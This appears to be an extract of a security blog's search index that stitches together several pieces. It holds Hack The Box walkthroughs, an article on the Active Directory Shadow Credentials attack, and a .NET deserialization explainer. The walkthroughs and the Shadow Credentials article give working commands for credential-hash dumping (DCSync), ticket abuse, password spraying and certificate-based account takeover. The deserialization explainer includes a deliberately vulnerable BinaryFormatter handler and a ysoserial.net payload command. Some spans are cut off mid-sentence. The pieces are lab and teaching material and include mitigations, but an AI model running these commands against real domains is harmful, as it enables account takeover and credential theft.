ticket is in memory:\nklist If you look we can see this ticket is valid for 10 years so as long no-one changes the krbtgt password (which is unlikely) we will have persistence. Connect Using my ticket using impacket-psexec:\nimpacket-psexec dc.$domain -k Dumping NTDS for fun for fun and profit: Now that we have persistence we might as well pillage:\nI perform a DCSync attack using netexec and dump all hashes:\nnetexec smb $box -u administrator --use-kcache -M ntdsutil Lessons Learned: What did I learn? I learned about the follina exploit, I had never used that exploit previously so was interesting using purely the malicious HTML part as a delivery mechanism for our exploit. I learned a lot about WSUS. Looking at the different architecture options available and how to query the registry was interesting from an enumeration point of view. I learned about the process of doing a shadow credentials attack. I even stopped the box halfway to do a deep-dive and made a blog post I found it so interesting: https://bloodstiller.com/articles/shadowcredentialsattack/ What silly mistakes did I make? Trying to download to C:\\\\Temp\\\\ you know the FAMOUS non-existent directory in windows! I had a couple of real dense moments when I was tired \u0026amp; over-thinking about how I could use the malicious Follina html instead of just sending the link. Oh, for some reason I kept forgetting to add the title with SharpWSUS. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

    "http:\/\/localhost:1313\/articles\/shadowcredentialsattack\/": {
        "title": "Understanding the Shadow Credentials Attack Vector",
        "tags": ["Windows","LDAP","msDS-KeyCredentialLink","Shadow Credentials","Active Directory","Rubeus","Whisker","pywhisker","cert","certificate","pem","PKINIT","Certificate Authority",],
        "content": "Understanding the Shadow Credentials Attack Vector: The Shadow Credentials attack is an advanced technique that exploits Active Directory\u0026rsquo;s certificate-based authentication mechanism to compromise user accounts without changing their passwords. This attack leverages the msDS-KeyCredentialLink attribute to add a malicious certificate, allowing an attacker to impersonate the target user stealthily.\nTo put it simply: If we have the WriteProperty privilege (specifically for the msDS-KeyCredentialLink attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.\nWhat are Shadow Credentials? The Shadow Credentials attack exploits a feature in Active Directory called Key Trust Account Mapping. This technique allows an attacker to compromise a user account without changing its password, making it particularly stealthy and difficult to detect.\nKey Components of the Shadow Credentials Attack: Whisker: A tool used to manipulate the msDS-KeyCredentialLink attribute of a user account. https://github.com/eladshamir/Whisker Rubeus: A tool for interacting with Kerberos authentication. https://github.com/GhostPack/Rubeus Enumerating Users Susceptible to the Shadow Credentials Attack: In blood-hound look for the AddKeyCredentialLink:\nBeing part of the groups below will often provide us with enough privielges to perform the attack:\nKey Admins Enterprise Key Admins Admins Group Enumerating for the WriteProperty msDS-KeyCredentialLink attribute on users: Using PowerView: Get-DomainObjectAcl -Identity \u0026#34;CN=\u0026lt;User Name\u0026gt;,CN=Users,DC=domain,DC=com\u0026#34; -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match \u0026#34;WriteProperty\u0026#34; -and $_.SecurityIdentifier -match \u0026#34;S-1-5-21-.*-500\u0026#34; -and $_.ObjectAceType -eq \u0026#34;00000002-0000-0000-c000-000000000000\u0026#34;} Using Active Directory PowerShell Module:\nImport-Module ActiveDirectory (Get-Acl \u0026#34;AD:CN=\u0026lt;User Name\u0026gt;,CN=Users,DC=domain,DC=com\u0026#34;).Access | Where-Object {$_.ActiveDirectoryRights -match \u0026#34;WriteProperty\u0026#34; -and $_.IdentityReference -match \u0026#34;Domain Admins\u0026#34; -and $_.ObjectType -eq \u0026#34;00000002-0000-0000-c000-000000000000\u0026#34;} Using ADSI Edit:\nA GUI tool for viewing and editing AD objects and their attributes. Connect to the domain Navigate to the user object Right-click and select \u0026ldquo;Properties\u0026rdquo; Go to the \u0026ldquo;Security\u0026rdquo; tab Click \u0026ldquo;Advanced\u0026rdquo; Look for entries with \u0026ldquo;Write msDS-KeyCredentialLink\u0026rdquo; permission Using dsacls Command-Line Tool:\ndsacls \u0026#34;CN=Target User,CN=Users,DC=domain,DC=com\u0026#34; | findstr /i \u0026#34;write.*msDS-KeyCredentialLink\u0026#34; +Shadow Credentials Attack Process: Step by Step+: Pre-requisites for Performing the Shadow Credentials Attack: Domain Functional Level: Must be 6 or higher (Windows Server 2016 or higher) Domain Controllers: The target domain must have at least one Domain Controller running Windows Server 2016 or higher. The Domain Controller used in the attack must have its own certificate and private keys. This requires the organization to have Active Directory Certificate Services (AD CS) or a similar Public Key Infrastructure (PKI), such as a Certification Authority (CA). Attacker Permissions:\nThe attacker starts with some level of access to the domain, typically with privileges to modify user attributes, e.g. GenericAll, GenericWrite The attacker needs control over an account with write access to the msDs-KeyCredentialLink attribute on the target user or computer account, this can be inherited via the above permissions. Shadow Credentials Attack From A Windows Host: 1. Whisker Execution: The attacker uses Whisker to add a new \u0026ldquo;shadow credential\u0026rdquo; to the target account:\nwhisker.exe add /target:nbarley /domain:sugarape.local This command:\nGenerates a certificate for the target user (in this case, nbarley) Updates the msDS-KeyCredentialLink attribute of the target account Outputs a Base64-encoded certificate and a password 2. Certificate Generation and Usage: Whisker creates:\nAn X.509 certificate An associated private key The certificate\u0026rsquo;s role in this attack:\nIt\u0026rsquo;s added to the user\u0026rsquo;s msDS-KeyCredentialLink attribute in Active Directory This attribute allows for certificate-based authentication as an alternative to password-based auth The certificate is not directly used like a Kerberos ticket (.kirbi file) Instead, the process works like this:\nThe attacker presents the certificate during the Kerberos authentication process Active Directory validates the certificate against the one stored in msDS-KeyCredentialLink If valid, AD issues a Kerberos Ticket Granting Ticket (TGT) for the user 3. Rubeus Exploitation The attacker then uses Rubeus to leverage the generated certificate:\nRubeus.exe asktgt /user:nbarley /certificate:[Base64 Certificate] /password:\u0026#34;[Password From Whisker]\u0026#34; /domain:sugarape.local /dc:DC.sugarape.local /getcredentials /show This command:\nUses the certificate to request a Kerberos TGT for Nathan Barley (nbarley) The /certificate parameter contains the Base64-encoded certificate The /getcredentials flag attempts to decrypt the encrypted NTLM hash from the TGT The /show flag displays the ticket details and other information If successful, Rubeus receives a TGT and can extract the NTLM hash 4. Credential Extraction As a result of this process:\nRubeus obtains a TGT for Nathan Barley (nbarley) \u0026amp; generates a .kirbi file which can be used for pass-the-ticket attacks. It also extracts the user\u0026rsquo;s NTLM hash Shadow Credentials From A Linux Host: This section is taken from my writeup for the box EscapeTwo: https://bloodstiller.com/walkthroughs/escapetwo-box/ Install Required Programs: We will need two programs to perform this attack pywhisker \u0026amp; pkinit .\npywhisker:\nIf you have not setup pywhisker before run the following commands to download the repo and setup a python virtual environment.\ngit clone https://github.com/ShutdownRepo/pywhisker.git cd pywhisker python3 -m venv whisker source whisker/bin/activate pip install -r requirements.txt pkinittools:\nIf you have not setup pkinittools before run the following commands to download the repo and setup a python virtual environment.\ngit clone https://github.com/dirkjanm/PKINITtools.git cd pkinit python -m venv pk source pk/bin/activate pip install -r requirements.txt 1. Attack Chain Overview: Make ourselves Owner of the ca_svc user account. Using impacket-owneredit. +Note+: In this scenario we have control over a user called ryan who has WriteOwner privileges over the user CA_SVC. Grant ourselves full privileges over the ca_svc account. Using impacket-dacledit. Perform Shadow Credentials Attack. Using pywhisker. Use gettgtpkinit to create a .ccache. Use getnthash to extract the NT has of the ca_svc user. 2. Modify Ownership of the ca_svc user Modify ownership so Ryan has full control of ca_svc:\nimpacket-owneredit -action write -new-owner \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass Grant ryan full privileges over the user ca_svc:\nimpacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass 3. Add shadow credentials to the ca_svc account \u0026amp; export .PEM: python3 pywhisker.py -d $domain -u $user -p $pass --target \u0026#34;CA_SVC\u0026#34; --action \u0026#34;add\u0026#34; --filename CACert --export PEM Ignore the capitalization of CA_SVC it doesn\u0026rsquo;t matter. 4. Requesting a TGT for ca_svc with PKINITtools getgtgkinit: Now we perform the same process again to be able to extract their hash by using the .pem files we have retrieved to export a .ccache we can authenticate with.\npython3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache Next we will load the .ccache into our KRB5CCNAME variable as we will need this for next step.\nexport KRB5CCNAME=./ca_svc.ccache 5. Requesting the ca_svc user hash with PKINITtools getnthash: Extract the NTHash for the ca_svc user:\npython3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c[SNIP]6aee9c22ff3391d9 $domain/CA_SVC We now have the ca_svc users NT hash. Verify the hash is valid: We now own the ca_svc user. Impact of the Shadow Credentials Attack The attacker gains the ability to authenticate as Nathan Barley nbarley This can lead to further lateral movement or privilege escalation within the domain The attack is stealthy, not triggering typical account modification alerts Shadow Credentials Attack Mitigation Strategies To protect against Shadow Credentials attacks:\nMonitor for changes to the msDS-KeyCredentialLink attribute Implement strong access controls on who can modify user attributes in Active Directory Use advanced threat detection systems that can identify unusual certificate-based authentication patterns Regularly audit and review certificate issuance and usage in your environment Implement the principle of least privilege for Active Directory administrators Use Protected Users security group for sensitive accounts Enable and configure Windows Defender Credential Guard Regularly patch and update domain controllers and Active Directory services Implement multi-factor authentication (MFA) for all user accounts, especially privileged ones Consider using Privileged Access Workstations (PAWs) for administrative tasks Shadow Credentials Attack Detection Methods Monitor Active Directory Logs: Look for Event ID 4662 with the msDS-KeyCredentialLink attribute being modified. Use PowerShell Scripts: Develop scripts to regularly check for unexpected changes to the msDS-KeyCredentialLink attribute. Implement SIEM Rules: Create alerts for unusual certificate-based authentication attempts, especially from unexpected sources. Network Traffic Analysis: Monitor for unusual Kerberos traffic patterns that might indicate certificate-based authentication abuse. Conclusion The Shadow Credentials attack vector demonstrates the evolving complexity of securing modern Active Directory environments. It highlights the importance of looking beyond traditional password-based security and considering certificate-based authentication mechanisms and critical user attributes.\nAs defenders, staying informed about these advanced techniques is crucial. By understanding attacks like Shadow Credentials, we can better prepare our defenses and protect our organizations from sophisticated threats.\nSources: I would recommend reading this for a DEEP dive onto it by the person who discovered the vulnerability: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab Here is a great video alos showcasing how simple this attack can be:\n", 
        "url": "http:\/\/localhost:1313\/articles\/shadowcredentialsattack\/"
    },

    "http:\/\/localhost:1313\/articles\/deserializationattacksexplained\/": {
        "title": "Understanding .NET Deserialization Exploits: A Deep Dive",
        "tags": [".NET","Deserialization","Serialization",],
        "content": "Understanding .NET Deserialization Exploits: A Deep Dive: .NET deserialization exploits have become a common technique; providing a pathway to remote code execution (RCE) on vulnerable systems. Tools like ysoserial.net can generate malicious payloads, allowing attackers to exploit deserialization flaws in .NET applications. But how does this attack vector actually work, and why does it succeed? In this post, we\u0026rsquo;ll walk through the underlying mechanics, focusing on an example using BinaryFormatter with a simple Student class. We\u0026rsquo;ll see how a seemingly innocuous application can be vulnerable to severe attacks.\nWhat is Serialization \u0026amp; Deserialization? Serialization: Serialization is the process of turning objects from a program into a format that\u0026rsquo;s easy to send (over the network) or save. Formats such as XML and JSON are commonly used for this purpose because they are human-readable compared to binary formats. Once serialized, these objects can be sent over the network or saved for later use. Deserialization: Is the reverse process: converting the transmitted data (e.g., JSON) back into a usable object in memory. For instance, consider a .NET application with a Student class. The code might look like this: [Serializable]\npublic class Student { public int StudentIDNumber { get; set; } public DateTime Birthday { get; set; } public string FirstName { get; set; } public string LastName { get; set; } } When serialized to JSON format, it would look like this: { \u0026#34;StudentIDNumber\u0026#34;:1337, \u0026#34;Birthday\u0026#34;:29062002, \u0026#34;FirstName\u0026#34;:\u0026#34;Nathan\u0026#34;, \u0026#34;LastName\u0026#34;:\u0026#34;Barley\u0026#34; } When serialized using BinaryFormatter, it would create a binary representation of this object. Exploiting Deserialization Vulnerabilities: Imagine an application that allows users to send serialized Student data, which the server converts back into usable objects using BinaryFormatter. If the deserialization process isn\u0026rsquo;t secure, an attacker can modify the data to control what kind of object gets created. Let\u0026rsquo;s explore how this can lead to a serious security vulnerability.\nBinaryFormatter Deserialization Attack: A Detailed Example: Let\u0026rsquo;s walk through how an attacker could exploit a vulnerable application that expects to deserialize Student objects but uses BinaryFormatter unsafely.\nStep 1: Understanding the Vulnerable Application: The application might have a method to process student data:\npublic class StudentProcessor { public void ProcessStudentData(string base64Data) { byte[] binaryData = Convert.FromBase64String(base64Data); using (MemoryStream ms = new MemoryStream(binaryData)) { BinaryFormatter formatter = new BinaryFormatter(); object deserializedObject = formatter.Deserialize(ms); if (deserializedObject is Student student) { // Process the student data Console.WriteLine($\u0026#34;Processed student: {student.FirstName} {student.LastName}\u0026#34;); } } } } +Note+: This code assumes it\u0026rsquo;s always receiving a serialized Student object, which is a dangerous assumption. Step 2: Crafting the Malicious Payload: Instead of sending a legitimate Student object, an attacker uses ysoserial.net to create a malicious payload:\nysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;cmd /c calc.exe\u0026quot; This generates a base64-encoded payload that, when deserialized, will launch the Windows calculator instead of creating a Student object.\nStep 3: Sending the Payload: The attacker sends this payload to the application, perhaps through an API endpoint or a file upload feature that expects serialized student data.\nStep 4: Unintended Deserialization: When the ProcessStudentData method runs, it blindly deserializes the input:\nobject deserializedObject = formatter.Deserialize(ms); Instead of creating a Student object, this line now creates and executes the attacker\u0026rsquo;s payload, launching calc.exe on the server.\nStep 5: Execution and Impact: The calculator launches on the server, demonstrating arbitrary code execution. In a real attack, this could be a reverse shell or any other malicious command.\nHow Does The Deserialization Attack Work? When deserializing data, the application should ideally be constrained to deserialize into a predefined set of safe classes. However, in vulnerable systems, this restriction doesn\u0026rsquo;t exist. Deserialization libraries like JSON.NET will attempt to deserialize any class that the attacker specifies.\nThis is where tools like ysoserial.net come in. They allow attackers to craft payloads that exploit known vulnerable classes and object types within .NET. The tool generates serialized objects designed to trigger behaviors (like executing commands) when they are deserialized.\nFor example, a crafted payload could exploit a method that runs upon deserialization, leveraging classes that allow arbitrary code execution. If a system blindly deserializes this payload without validation, it unwittingly runs the attacker\u0026rsquo;s code.\nWhy Does This Happen? The root cause of these exploits is a failure to properly validate or restrict what classes the deserialization process can instantiate. By allowing any arbitrary object to be deserialized, attackers can manipulate the data in a way that turns simple data handling into a serious security vulnerability.\nUnderstanding Ysoserial.Net Payloads: Let\u0026rsquo;s break down how ysoserial.net generates a payload for a BinaryFormatter deserialization exploit, contrasting it with our Student class example:\nLegitimate Student Object Serialization: A legitimate serialized Student object using BinaryFormatter might look like this in binary format:\n// Binary representation (simplified for illustration) [SerializationHeaderRecord][ObjectTypeEnum:SystemObject][AssemblyId][ClassName:Student][MemberCount:4] [MemberName:StudentIDNumber][PrimitiveTypeEnum:Int32][Value:1337] [MemberName:Birthday][PrimitiveTypeEnum:DateTime][Value:29062002] [MemberName:FirstName][PrimitiveTypeEnum:String][Value:Nathan] [MemberName:LastName][PrimitiveTypeEnum:String][Value:Barley] This representation includes type information and metadata that BinaryFormatter uses to reconstruct the object during deserialization.\nMalicious Payload Generation: Now, let\u0026rsquo;s examine how ysoserial.net crafts a malicious payload:\nysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;cmd /c calc.exe\u0026quot;\nThis command generates a base64-encoded payload. When decoded, it might look something like this (simplified):\n// Binary representation (simplified for illustration) [SerializedObjectWithTypeWindowsIdentity][4-byte-length][TypeInfo:WindowsIdentity][MethodToInvoke:Start][Arguments:\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c calc.exe\u0026#34;] Breaking Down the Payload: Object Type: Instead of SerializedStudent, the payload specifies a WindowsIdentity object. Malicious Method: It includes instructions to invoke the Start method, which can execute commands. Command Arguments: The payload includes the command to be executed (calc.exe in this case). Exploitation Process: The vulnerable ProcessStudentData method receives this payload instead of a legitimate Student object. When deserialized, instead of creating a Student instance, it creates a WindowsIdentity object. The deserialization process triggers the execution of the Start method with the provided arguments. As a result, calc.exe is launched on the server, demonstrating arbitrary code execution. This example illustrates how an attacker can exploit the flexibility of BinaryFormatter to execute arbitrary code, even when the application expects a completely different type of object (in our case, a Student).\nPreventing Deserialization Exploits: To protect against these types of attacks, even when working with seemingly harmless classes like our Student example:\nWhitelist Classes: Limit deserialization to specific, safe classes and types. For instance, only allow the Student class to be deserialized. Disable Automatic Deserialization: Avoid deserialization of user-controlled data unless absolutely necessary. If you must deserialize, consider safer alternatives to BinaryFormatter. Use Secure Libraries: Keep libraries updated, as security patches are often released to address deserialization flaws. Sanitize Inputs: Always validate and sanitize any data being deserialized to ensure it conforms to expected formats. Implement Custom Serialization: For classes like Student, consider implementing custom serialization methods that don\u0026rsquo;t rely on potentially dangerous automatic deserialization. By implementing these measures, you can significantly reduce the risk of deserialization attacks, even when working with simple data structures.\nConclusion: Deserialization vulnerabilities, particularly those involving BinaryFormatter, pose a significant risk to .NET applications. As we\u0026rsquo;ve seen with our Student class example, even seemingly innocuous code can be exploited to execute arbitrary commands. By understanding these risks and implementing proper security measures, developers can create more robust and secure applications.\nCorrections: Please let me know if I have anything wrong, more than happy to make corrections. ", 
        "url": "http:\/\/localhost:1313\/articles\/deserializationattacksexplained\/"
    },

        "content": "Scrambled Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Scrambled How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:18:34 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 08:18 BST Nmap scan report for 10.129.174.234 Host is up (0.039s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds Some great targets here: webserver dns smb ldap mssql In depth scan:\nsudo nmap ction level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=scrm,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. Kerberos 88: User enumeration using Kerbrute : I use kerbrute to check for usernames: kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I find 5 valid usersnames, I add these to my list of usernames: SMB 445: Checking for NULL \u0026amp; Guest Sessions netexec: I check for NULL \u0026amp; Guest session but they are not accessible:\nnetexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares I check to see if any of the users I found in kerbrute have used any of their names as a password:\nnetexec smb $box -u Users.txt -p Users.txt --continue-on-success No hits though: DNS 5 6rsquo;s most interesting to me is that the banner \u0026amp; and the responses are all followed by a semi-colon ; this is what usually follows an SQL/MSSQL statement. In the NMAP we can also see near the end it says ms-sql-s, oracle-tns: I try entering oracle-sql queries:\nSELECT * FROM v$version; No luck lets come back to this later. 2. Authenticated Enumeration: Realizing the mistake I made when enumerating: After alot of enumeration, and some strange results from netexec and some other tools it dawned on me, all of my checks have been with netexec and SMB….which used NTLM….I need to try and connect to the service using kerberos if possible. I need to cred stuff using usernames as passwords but authenticating using kerberos. Connecting to the SMB shares as ksimpson: As we cannot use NTLM authentication we have to force kerberos authentication. This is possible by passing most programs the -k flag, however most tools expect to be fed a .cacche authentication file by way fo the KRB5CCNAME variable in linux. So we have to somehow create a .cacche file or pass the creds directly on the CLI and have kerberos authenticate using them. I do some digging and I cannot find direct way to craft my own .cacche file. So instead I look to tools I can try and force into using CLI fed creds but authenticate using the kerberos protocol. Trying to force netexec to use kerberos authentication: I try on netexec by passing the -k flag, but it does not work: I try multiple methods but none work.\nnetexec smb $box -k netexec smb $box -u ksimpson -k netexec smb $box -u ksimpson -p ksimpson -k +Note+: I am using ksimpson as it just kinda feels like the move, with how much we have seen that username so far. Back to the drawing board.\nTrying to force smbmap to use kerberos authentication: I try to connect this time with smbmap and it\u0026rsquo;s the same issue: smbmap -u $user -H $box -k Trying to force smbclient to use kerberos authentication: Big ol\u0026rsquo; *miss here:\nsmbclient -U
